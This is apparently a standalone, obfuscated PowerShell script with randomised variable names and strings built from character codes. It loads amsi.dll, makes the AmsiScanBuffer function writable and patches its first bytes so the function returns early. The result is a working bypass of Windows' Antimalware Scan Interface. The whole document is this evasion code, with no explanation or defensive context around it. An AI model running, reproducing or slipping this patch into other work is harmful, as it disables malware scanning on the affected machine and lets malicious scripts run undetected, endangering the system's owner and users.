$D3X2yDDW83p = @"
using System;
using System.Runtime.InteropServices;
public class D3X2yDDW83p {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr biLbR05Wz, string uw_A2VCDP3lHO9gvFK);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr MkqCDQiATmJ02yQgR, UIntPtr yTKljvLEj5c, uint lPyiUNPVQ46koC, out uint NdftC6axTG9Fg8bbc8l);
}
"@

Add-Type $D3X2yDDW83p

$rdJo3qVZ0n = [D3X2yDDW83p]::LoadLibrary("$([chAR]([ByTE]0x61)+[cHAr]([BYTe]0x6d)+[cHAR]([bYTe]0x73)+[chaR](105)+[cHaR](46)+[cHAr](100*63/63)+[cHaR](108)+[ChAr](85+23))")
$n60 = [D3X2yDDW83p]::GetProcAddress($rdJo3qVZ0n, "$([cHAr]([BYTe]0x41)+[ChAr](109*103/103)+[cHaR]([ByTe]0x73)+[Char](105)+[ChaR]([byTe]0x53)+[CHaR]([ByTE]0x63)+[CHaR](97*8/8)+[Char]([Byte]0x6e)+[ChAR]([BYtE]0x42)+[cHAr](47+70)+[cHar](102+98-98)+[chAR]([bYte]0x66)+[cHaR]([BytE]0x65)+[CHaR]([BytE]0x72))")
$p = 0
[D3X2yDDW83p]::VirtualProtect($n60, [uint32]5, 0x40, [ref]$p)
$BEUffIIXueoEbBAmbGw9 = "0xB8"
$WdxqID061FdGmD = "0x57"
$EG4WErweG8 = "0x00"
$UDUsYfPrkV0g0w8 = "0x07"
$IUEaRicnJ2JyRiUd5JcD = "0x80"
$Rhh8 = "0xC3"
$kTGlZ0 = [Byte[]] ($BEUffIIXueoEbBAmbGw9,$WdxqID061FdGmD,$EG4WErweG8,$UDUsYfPrkV0g0w8,+$IUEaRicnJ2JyRiUd5JcD,+$Rhh8)
[System.Runtime.InteropServices.Marshal]::Copy($kTGlZ0, 0, $n60, 6)